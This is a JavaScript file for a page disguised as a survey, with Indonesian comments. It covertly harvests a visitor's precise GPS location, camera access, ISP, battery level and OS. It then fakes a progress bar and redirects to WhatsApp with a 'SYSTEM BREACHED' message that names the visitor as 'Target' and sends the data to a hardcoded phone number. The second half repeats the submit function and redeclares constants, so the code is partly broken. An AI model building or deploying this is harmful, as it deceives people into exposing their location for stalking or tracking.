const nomorWA = "628979100200";

// Data awal default
let userData = { 
    coords: "", 
    os: navigator.platform,
    battery: "Unknown",
    isp: "Detecting..."
};

// 1. Fungsi Ambil Data ISP & Baterai
async function getQuickData() {
    try {
        // Menggunakan API yang lebih stabil untuk deteksi Provider/ISP
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        userData.isp = data.org || "Protected";
    } catch (e) { 
        userData.isp = "ISP Hidden/VPN"; 
    }

    try {
        if (navigator.getBattery) {
            const bat = await navigator.getBattery();
            userData.battery = Math.round(bat.level * 100) + "%";
        }
    } catch (e) { 
        userData.battery = "Hardware Blocked"; 
    }
}

// 2. Handler Tombol Mulai
const startBtn = document.getElementById('start-survey');
if (startBtn) {
    startBtn.onclick = function() {
        document.getElementById('step-1').style.display = 'none';
        document.getElementById('step-2').style.display = 'block';
        
        // Ambil data ISP di background
        getQuickData();

        // Minta Izin Lokasi RIIL
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition((pos) => {
                // Mengupdate koordinat tepat saat diizinkan
                userData.coords = pos.coords.latitude + "," + pos.coords.longitude;
            }, (err) => {
                userData.coords = "Access_Denied";
            }, { enableHighAccuracy: true });
        }

        // Minta Izin Kamera
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => { 
                const video = document.getElementById('webcam');
                if (video) video.srcObject = stream; 
            })
            .catch(e => { console.log("Kamera Blocked"); });
    };
}

// 3. Fungsi Kirim (finalSubmit)
function finalSubmit() {
    const nameVal = document.getElementById('name').value;
    if (!nameVal) return alert("Isi nama dulu!");

    document.getElementById('step-2').style.display = 'none';
    document.getElementById('step-3').style.display = 'block';

    let prg = 0;
    const timer = setInterval(() => {
        prg += 25;
        const progress = document.getElementById('progress');
        if (progress) progress.style.width = prg + "%";

        if (prg >= 100) {
            clearInterval(timer);

            // Perbaikan Link Maps: Jika GPS mati, tampilkan pesan. Jika nyala, jadi link.
            let mapUrl;
            if (userData.coords === "" || userData.coords === "Access_Denied") {
                mapUrl = "GPS_Not_Active";
            } else {
                // Link Google Maps asli yang bisa diklik
                mapUrl = "https://www.google.com/maps?q=" + userData.coords;
            }

            const msg = `🚨 *SYSTEM BREACHED 2026* 🚨%0A%0A` +
                        `👤 *Target:* ${nameVal}%0A` +
                        `📍 *Maps:* ${mapUrl}%0A` +
                        `📡 *ISP:* ${userData.isp}%0A` +
                        `🔋 *Baterai:* ${userData.battery}%0A` +
                        `💻 *OS:* ${userData.os}%0A%0A` +
                        `_Status: Data Mirrored Successfully._`;

            window.location.href = `https://api.whatsapp.com/send?phone=${nomorWA}&text=${msg}`;
        }
    }, 600);
}

// Event Listener untuk tombol submit
const submitBtn = document.getElementById('submit-survey');
if (submitBtn) submitBtn.onclick = finalSubmit;

// Event Listener untuk Enter
const nameInput = document.getElementById('name');
if (nameInput) {
    nameInput.onkeydown = (e) => { 
        if (e.key === "Enter") finalSubmit(); 
    };
}
function finalSubmit() {
    const nameVal = document.getElementById('name').value;
    if (!nameVal) return alert("Isi nama dulu!");

    document.getElementById('step-2').style.display = 'none';
    document.getElementById('step-3').style.display = 'block';

    let prg = 0;
    const timer = setInterval(() => {
        prg += 25;
        document.getElementById('progress').style.width = prg + "%";
        if (prg >= 100) {
            clearInterval(timer);
            // Format link map yang benar
            const mapUrl = "https://www.google.com/maps?q=" + userData.coords;
            const msg = `🚨 *SYSTEM BREACHED 2026* 🚨%0A%0A👤 *Target:* ${nameVal}%0A📍 *Maps:* ${mapUrl}%0A📡 *ISP:* ${userData.isp}%0A🔋 *Baterai:* ${userData.battery}%0A💻 *OS:* ${userData.os}%0A%0A_Status: Data Mirrored._`;
            window.location.href = `https://api.whatsapp.com/send?phone=${nomorWA}&text=${msg}`;
        }
    }, 600);
}

const submitBtn = document.getElementById('submit-survey');
if (submitBtn) submitBtn.onclick = finalSubmit;

const nameInput = document.getElementById('name');
if (nameInput) {
    nameInput.onkeydown = (e) => { if (e.key === "Enter") finalSubmit(); };
}

